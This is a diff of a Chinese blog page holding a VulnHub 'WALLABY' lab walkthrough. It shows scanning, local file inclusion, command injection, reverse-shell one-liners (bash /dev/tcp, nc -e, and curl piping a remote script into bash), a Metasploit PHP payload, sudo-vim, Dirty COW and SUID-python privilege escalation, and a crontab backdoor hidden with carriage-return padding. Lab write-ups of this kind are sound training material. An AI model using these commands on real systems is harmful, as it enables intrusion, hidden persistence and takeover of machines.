@@ -117,12 +117,12 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/HBF3Xx8TkufEAiz.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/lzxCnDdB1eoSati.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/Atnrq5DWxYZj7wN.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/ACqEVOecQP5RyuK.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/DmrBVlwMeUxpa4K.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/brPBKf6e7oSkgvO.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/zqTVIhAkrmZgoSj.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/IN5LOBHrAwVsnC4.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/paNiQwcqzXCExYj.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/vL1l7HIUp4ZPtYc.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/KW4nDo2ZJuVILkS.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/lO78YkmNuUB9rZ1.jpg"></li>
         </ul>
       </div>
     </header>
@@ -172,7 +172,7 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
  教程链接地址：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1L2FydGljbGUvZGV0YWlscy8xMDQwOTUwMjk=">https://blog.csdn.net/qq_34801745/article/details/104095029</span></p>
 <h3 id="确认攻击目标"><a class="markdownIt-Anchor" href="#确认攻击目标">#</a> 确认攻击目标</h3>
 <p>攻击机 KALI： 192.168.31.135<br>
- 靶机 NAPPING：桥接于 192.168.31.1 的网卡，ip 未知</p>
+ 靶机 WALLABY：桥接于 192.168.31.1 的网卡，ip 未知</p>
 <ol>
 <li>
 <p>通过 netdiscover 扫描当前网卡里边有哪些机器<br>
@@ -187,57 +187,57 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
 <li>去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP<br>
  <code>sudo nmap -PA 192.168.31.107 --excludefile myip.txt</code></li>
 </ol>
-<p><img data-src="/N1h1l157/VULNHUB/image-150.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-150.png" width="550" alt="Image">
 <p>-&gt; 目标机器的 ip 地址： 192.168.31.5</p>
 <ol start="4">
 <li>确认靶机 ip 开放的端口信息</li>
 </ol>
 <p><code>sudo nmap -A -p- 192.168.31.15 -oN /tmp/wallaby.txt</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-151.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-151.png" width="460" alt="Image">
 <p>-&gt; 靶机开放端口 22, 80, 6667</p>
 <h3 id="lfi-漏洞测试"><a class="markdownIt-Anchor" href="#lfi-漏洞测试">#</a> LFI 漏洞测试</h3>
 <ol>
 <li>打开 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuNS8=">http://192.168.31.5/</span> 进行信息收集</li>
 </ol>
-<p><img data-src="/N1h1l157/VULNHUB/image-152.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-152.png" width="390" alt="Image">
 <p>输入名字并登陆此网站</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-153.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-153.png" width="390" alt="Image">
 <p>观察 url 地址，发现存在 lfi 本地文件包含漏洞</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-154.png" alt></p>
 <p>直接构造 http://192.168.31.5/?page=/etc/passwd</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-155.png" alt></p>
 <p>访问 http://192.168.31.5/?page=/etc/sudoers 发现对方管理员检测到了 lfi 攻击</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-156.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-156.png" width="520" alt="Image">
 <p>重新访问 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuNS8=">http://192.168.31.5/</span> 发现网站已经挂掉了</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-157.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-157.png" width="520" alt="Image">
 <p>-&gt; 80 端口被关闭，网站已被注销，重新尝试端口扫描</p>
 <h3 id="60080-网站信息收集"><a class="markdownIt-Anchor" href="#60080-网站信息收集">#</a> 60080 网站信息收集</h3>
 <p>重新扫描端口，发现 80 被关闭，新开了一个 60080 端口网站<br>
 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC8="> http://192.168.31.5:60080/</span> 渗透测试</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-158.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-158.png" width="440" alt="Image">
 <p>发现此端口确实存在网站，目标转为对此网站的分析</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-159.png" alt></p>
 <p>目录爆破，收集更多的目录信息</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.31.5:60080/</span><br><span class="line">gobuster dir -u http://192.168.31.5:60080/ - w /usr/share/dirbuster/wordlists/directory-</span><br><span class="line">list-2.3-medium.txt -x php,txt,html</span><br></pre></td></tr></table></figure>
-<p><img data-src="/N1h1l157/VULNHUB/image-160.png" alt></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.31.5:60080/</span><br><span class="line">gobuster dir -u http://192.168.31.5:60080/ - w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html</span><br></pre></td></tr></table></figure>
+<img data-src="/N1h1l157/VULNHUB/image-160.png" width="580" alt="Image">
 <p>并没有发现任何有价值的信息</p>
 <h3 id="dirb-目录扫描"><a class="markdownIt-Anchor" href="#dirb-目录扫描">#</a> dirb 目录扫描</h3>
 <p>仔细回想之前的操作，在 80 端口对网站渗透时，发现了 lfi 漏洞<br>
 是在 http://192.168.31.5/?page=home 上的，尝试访问 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC8/cGFnZT1ob21l">http://192.168.31.5:60080/?page=home</span> 仍存在 lfi 漏洞</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-161.png" alt></p>
 <p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC8/cGFnZT0vZXRjL3N1ZG9lcnM=">http://192.168.31.5:60080/?page=/etc/sudoers</span></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-162.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-162.png" width="500" alt="Image">
 <p>使用 dirb 对 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC8/cGFnZT0=">http://192.168.31.5:60080/?page=</span> 目录进行扫描</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">dirb是一个基于字典的web目录扫描工具，查找现有的（和/或隐藏的）Web对象，通过对Web服务器发起基于字典的攻击并分析响应的数据。</span></span><br><span class="line">dirb http://192.168.31.5:60080/index.php?page=</span><br></pre></td></tr></table></figure>
-<p><img data-src="/N1h1l157/VULNHUB/image-163.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-163.png" width="570" alt="Image">
 <p>-&gt; 敏感网址：<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXI=">http://192.168.31.5:60080/index.php?page=mailer</span></p>
 <p>将这些文件访问了一遍之后，发现此网站是唯一可能存在漏洞的目标</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-164.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-164.png" width="520" alt="Image">
 <p>检查源代码，发现这里有一个 rce 漏洞</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-165.png" alt></p>
 <p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9bWFpbA==">http://192.168.31.5:60080/index.php?page=mailer&amp;mail=mail</span><br>
 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9bHM=">http://192.168.31.5:60080/index.php?page=mailer&amp;mail=ls</span></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-166.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-166.png" width="520" alt="Image">
 <h3 id="phpcurlbashnc-反弹"><a class="markdownIt-Anchor" href="#phpcurlbashnc-反弹">#</a> php/curl/bash/nc 反弹</h3>
 <p>判断目标服务器上是否存在相关的命令<br>
 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9d2hpY2glMjBjdXJs"> http://192.168.31.5:60080/index.php?page=mailer&amp;mail=which%20curl</span><br>
@@ -246,7 +246,7 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9d2hpY2glMjBuYw==">http://192.168.31.5:60080/index.php?page=mailer&amp;mail=which%20nc</span></p>
 <p>也可以直接一句话判断所有的信息：<br>
 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9d2hpY2glMjBjdXJsO3doaWNoJTIwcGhwO3doaWNoJTIwcHl0aG9uO3doaWNoJTIwYmFzaDs=">http://192.168.31.5:60080/index.php?page=mailer&amp;mail=which curl;which php;which python;which bash;</span></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-167.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-167.png" width="560" alt="Image">
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">根据收集到的服务器上的信息进行反弹shell</span></span><br><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.31.135&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br><span class="line">curl http://www.chentuo.asia/shell.sh | bash (success)</span><br><span class="line">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.31.135/4444 0&gt;&amp;1&#x27;</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.31.135/4445 0&gt;&amp;1</span><br><span class="line">nc 192.168.31.135 4444 -e /bin/bash</span><br></pre></td></tr></table></figure>
 <p><img data-src="/N1h1l157/VULNHUB/image-168.png" alt></p>
 <h3 id="kali-php木马反弹"><a class="markdownIt-Anchor" href="#kali-php木马反弹">#</a> kali php 木马反弹</h3>
@@ -263,34 +263,34 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
 <h3 id="msf生成php反弹"><a class="markdownIt-Anchor" href="#msf生成php反弹">#</a> msf 生成 php 反弹</h3>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">msf生成php木马</span></span><br><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">set target 1</span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.31.135</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将msf生成的php反弹shell的代码直接粘贴在url地址上即可</span></span><br><span class="line">http://192.168.31.5:60080/index.php?page=mailer&amp;mail=php%20-d%20allow_url_fopen=true%20-</span><br><span class="line"><span class="meta prompt_">r%</span><span class="language-bash">20%22eval(file_get_contents(%27http://192.168.31.135:8080/Dk00YRQ%27,%20false,%20stream_context_create([%27ssl%27=%3E[%27verify_peer%27=%3Efalse,%27verify_peer_name%27=%3Efalse]])));%22</span></span><br></pre></td></tr></table></figure>
 <p>在此阶段，不要退出 msf，只要 msf 在线，生成的 php 代码运行之后，msf 就会接收到 sessions</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-172.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-172.png" width="620" alt="Image">
 <h3 id="stty-异常处理"><a class="markdownIt-Anchor" href="#stty-异常处理">#</a> stty 异常处理</h3>
 <p>注意使用 msf 的时候如果也用了 stty 会出现下面这个问题</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-173.png" alt></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">即enter键被转化为了^M 此时再输入任何命令都无法执行了</span><br><span class="line">哪怕重启msf也无效，这里需要先退出msf，并执行stty sane，可将问题解决</span><br><span class="line">命令sane最常出现在大多数终端的stty选项的集合中，它并不改变通信信道</span><br><span class="line">的速率，但当终端发生混乱时，通常能够产生有益的效果。</span><br></pre></td></tr></table></figure>
 <h3 id="权限移到另一shell"><a class="markdownIt-Anchor" href="#权限移到另一shell">#</a> 权限移到另一 shell</h3>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">当前终端：</span></span><br><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.31.135/4445 0&gt;&amp;1</span><br><span class="line">nc - lvvp 4445</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">新的终端：</span></span><br><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">stty raw -echo;fg</span><br><span class="line">export TERM=xterm</span><br></pre></td></tr></table></figure>
-<p><img data-src="/N1h1l157/VULNHUB/image-174.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-174.png" width="520" alt="Image">
 <h3 id="sudovim提权"><a class="markdownIt-Anchor" href="#sudovim提权">#</a> sudo (vim) 提权</h3>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo -l 发现使用waldo执行vim可以免密</span><br><span class="line">sudo -u waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf</span><br><span class="line">esc --&gt; :!/bin/bash</span><br><span class="line">esc --&gt; :!bash -i &gt;&amp; /dev/tcp/192.168.31.135/4447 0&gt;&amp;1 可拿到反弹shell</span><br></pre></td></tr></table></figure>
 <p><img data-src="/N1h1l157/VULNHUB/image-175.png" alt></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-176.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-176.png" width="520" alt="Image">
 <h3 id="脏牛提权"><a class="markdownIt-Anchor" href="#脏牛提权">#</a> 脏牛提权</h3>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/firefart/dirtycow/archive/refs/heads/master.zip</span><br><span class="line">scp -r parallels@192.168.31.135:~/Desktop/tool/dirtycow/dirtycow-master /tmp</span><br><span class="line">cd dirtycow-master</span><br><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line">./dirty</span><br></pre></td></tr></table></figure>
-<p><img data-src="/N1h1l157/VULNHUB/image-177.png" alt><br>
-服务器崩溃，提权失败，需要重启服务器</p>
+<img data-src="/N1h1l157/VULNHUB/image-177.png" width="570" alt="Image">
+服务器崩溃，提权失败，需要重启服务器
 <h3 id="issri-攻击-irc"><a class="markdownIt-Anchor" href="#issri-攻击-irc">#</a> issri 攻击 irc</h3>
 <ol>
 <li>修改防火墙规则，允许链接 irc<br>
  在 www-data 用户的时候，发现可以直接调用 root 改变 iptables</li>
 </ol>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前的防火墙规则</span></span><br><span class="line">sudo iptables -L</span><br><span class="line"></span><br><span class="line">同由于它是一个易受攻击的机器，我们看到我们从外部发送到irc的包通过使,用授予所有用户的管理 iptables 的权限被丢弃，我们删除了这个丢弃规则。</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重写第二条规则以允许端口 6667 上的 TCP 连接</span></span><br><span class="line">sudo iptables -R INPUT 2 -p tcp --dport 6667 -j ACCEPT</span><br><span class="line">sudo iptables -L</span><br><span class="line"></span><br><span class="line">而在nmap扫描端口时也出现了 6667 irc服务</span><br><span class="line">改变iptables之后我们可以通过irssi连接到irc</span><br></pre></td></tr></table></figure>
-<p><img data-src="/N1h1l157/VULNHUB/image-178.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-178.png" width="570" alt="Image">
 <ol start="2">
 <li>
 <p>issri 连接至 irc<br>
  <code>irssi -c 192.168.31.5 -p 6667 列出频道 /list</code> <br>
-<img data-src="/N1h1l157/VULNHUB/image-179.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-179.png" width="520" alt="Image"></p>
 </li>
 <li>
 <p>加入了 wallabyschat 频道 /join #wallabyschat<br>
@@ -315,13 +315,13 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
 <li>伪造身份登陆 irssi</li>
 </ol>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">通过sudo -l中的vim权限设置错误提升权限</span><br><span class="line">sudo -u waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf</span><br><span class="line">esc --&gt; :!/bin/bash 提权至waldo权限</span><br></pre></td></tr></table></figure>
-<p><img data-src="/N1h1l157/VULNHUB/image-184.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-184.png" width="470" alt="Image">
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这里有一个irssi.sh的文件，会以waldo的身份运行shell</span><br><span class="line">他的设置有问题。如果 Tmux 宕机，他的 IRC 连接也会宕机。</span><br><span class="line">pkill tmux</span><br><span class="line">who</span><br></pre></td></tr></table></figure>
-<p><img data-src="/N1h1l157/VULNHUB/image-185.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-185.png" width="470" alt="Image">
 <ol start="8">
 <li>
 <p>在 irssi 中修改别名为 waldo：/nick waldo<br>
-<img data-src="/N1h1l157/VULNHUB/image-186.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-186.png" width="520" alt="Image"></p>
 </li>
 <li>
 <p>现在我们用 waldo 身份来运行 run 看会有什么效果<br>
@@ -338,17 +338,17 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
 <p>adm 组确实看起来很有希望。由于 .run 需要一个文件，因此我创建了一个包含以下内容的文件：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">sudo -l</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用具有s权限的python进行提权, 修改下一个脚本以将 suid 位应用于 python 可执行文件：</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">sudo chmod 4777 /usr/bin/python2.7</span><br></pre></td></tr></table></figure>
 <p>通过 irssi 执行此脚本，将 python2.7 添加上 SUID 权限<br>
-<img data-src="/N1h1l157/VULNHUB/image-189.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-189.png" width="270" alt="Image"></p>
 <p>此后可以退出 irssi 了 /quit</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls - al /usr/bin/python2.7</span><br><span class="line">python -c &quot;import os; os.setuid(0); os.system(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
-<p><img data-src="/N1h1l157/VULNHUB/image-190.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-190.png" width="520" alt="Image">
 <p>提权成功拿到了 root 权限</p>
 <h3 id="隐蔽cron权限维持"><a class="markdownIt-Anchor" href="#隐蔽cron权限维持">#</a> 隐蔽 cron 权限维持</h3>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前计划任务有哪些</span> </span><br><span class="line">crontab -l</span><br><span class="line"></span><br><span class="line">cat &gt; /root/.first.sh &lt;&lt;EOF</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.31.135/4444 0&gt;&amp;1</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">cat &gt; /root/.second.sh &lt;&lt; EOF</span><br><span class="line">(crontab -l;printf &quot;*/1 * * * * /root/.first.sh;\rno crontab for `whoami`%100c\n&quot;)|crontab -</span><br><span class="line">EOF</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">*/1 * * * *：每隔 1 分钟执行一次；</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/r：<span class="built_in">cat</span>默认支持 \r 回车符 \n 换行符 \f 换页符这些符号，会导致显示截断隐藏命令，隐藏真实的计划任务；</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">%100c：格式化输出一个字符，前面 99 个空格补齐。使用空格帮助我们把前面的内容在 crontab 中遮盖掉；</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果想让创建的文件隐蔽性更强，可以创建名为<span class="string">&quot;..&quot;</span>、“...”或以..等开头的文件。</span></span><br><span class="line"></span><br><span class="line">chmod 777 .first.sh</span><br><span class="line">chmod 777 .second.sh</span><br><span class="line">/root/.second.sh</span><br></pre></td></tr></table></figure>
-<p><img data-src="/N1h1l157/VULNHUB/image-191.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-191.png" width="520" alt="Image">
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果发现无法运行，可以通过下列两个命令查看详细计划任务</span></span><br><span class="line">cat /var/spool/cron/crontabs/root -A</span><br><span class="line">crontab -e 或者 vi /etc/crontab</span><br></pre></td></tr></table></figure>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在kali机器上监听 4444 端口，每隔一分钟收到将会一次shell</span></span><br><span class="line">nc - lvvp 4444</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行一下命令产生一个标准的shell：</span></span><br><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">stty raw -echo;</span><br></pre></td></tr></table></figure>
-<p><img data-src="/N1h1l157/VULNHUB/image-192.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-192.png" width="520" alt="Image">
 <p>-&gt; 只要开启 kali 的 4444 端口，很快就会收到 root 账户的 shell</p>
 
       <div class="tags">
@@ -364,7 +364,7 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">更新于</span>
-    <time title="修改时间：2023-07-04 23:15:08" itemprop="dateModified" datetime="2023-07-04T23:15:08+08:00">2023-07-04</time>
+    <time title="修改时间：2023-07-06 23:11:20" itemprop="dateModified" datetime="2023-07-06T23:11:20+08:00">2023-07-06</time>
   </span>
   <span id="2021/11/01/VULNHUB/109 WALLABY/" class="item leancloud_visitors" data-flag-title="VULNHUB 9 WALLABY" title="阅读次数">
       <span class="icon">
@@ -427,17 +427,17 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
     <div class="item left">
       
 
-  <a href="/2021/11/01/VULNHUB/107%20RECON/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;BCMkIXvxWUj69pG.jpg" title="VULNHUB 7 RECON">
+  <a href="/2021/11/01/VULNHUB/106%20SYMFONOS/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;IN5LOBHrAwVsnC4.jpg" title="VULNHUB 6 SYMFONOS">
   <span class="type">上一篇</span>
   <span class="category"><i class="ic i-flag"></i> VULNHUB</span>
-  <h3>VULNHUB 7 RECON</h3>
+  <h3>VULNHUB 6 SYMFONOS</h3>
   </a>
 
     </div>
     <div class="item right">
       
 
-  <a href="/2021/11/01/VULNHUB/108%20MATRIX/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;lzxCnDdB1eoSati.jpg" title="VULNHUB 8 MATRIX">
+  <a href="/2021/11/01/VULNHUB/108%20MATRIX/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;OqYw1kD5yZdImSe.jpg" title="VULNHUB 8 MATRIX">
   <span class="type">下一篇</span>
   <span class="category"><i class="ic i-flag"></i> VULNHUB</span>
   <h3>VULNHUB 8 MATRIX</h3>
@@ -463,7 +463,7 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
       </div>
       <div class="related panel pjax" data-title="系列文章">
         <ul>
-          <li><a href="/2021/11/01/VULNHUB/101%20EVM/" rel="bookmark" title="VULNHUB 1 EVM">VULNHUB 1 EVM</a></li><li><a href="/2021/11/01/VULNHUB/102%20NAPPING/" rel="bookmark" title="VULNHUB 2 NAPPING">VULNHUB 2 NAPPING</a></li><li><a href="/2021/11/01/VULNHUB/103%20HACKSUDO/" rel="bookmark" title="VULNHUB 3 HACKSUDO">VULNHUB 3 HACKSUDO</a></li><li><a href="/2021/11/01/VULNHUB/104%20BREAKOUT/" rel="bookmark" title="VULNHUB 4 BREAKOUT">VULNHUB 4 BREAKOUT</a></li><li><a href="/2021/11/01/VULNHUB/106%20SYMFONOS/" rel="bookmark" title="VULNHUB 6 SYMFONOS">VULNHUB 6 SYMFONOS</a></li><li><a href="/2021/11/01/VULNHUB/105%20EARTH/" rel="bookmark" title="VULNHUB 5 EARTH">VULNHUB 5 EARTH</a></li><li><a href="/2021/11/01/VULNHUB/108%20MATRIX/" rel="bookmark" title="VULNHUB 8 MATRIX">VULNHUB 8 MATRIX</a></li><li class="active"><a href="/2021/11/01/VULNHUB/109%20WALLABY/" rel="bookmark" title="VULNHUB 9 WALLABY">VULNHUB 9 WALLABY</a></li><li><a href="/2021/11/01/VULNHUB/107%20RECON/" rel="bookmark" title="VULNHUB 7 RECON">VULNHUB 7 RECON</a></li><li><a href="/2021/11/01/VULNHUB/110%20RED/" rel="bookmark" title="VULNHUB 10 RED">VULNHUB 10 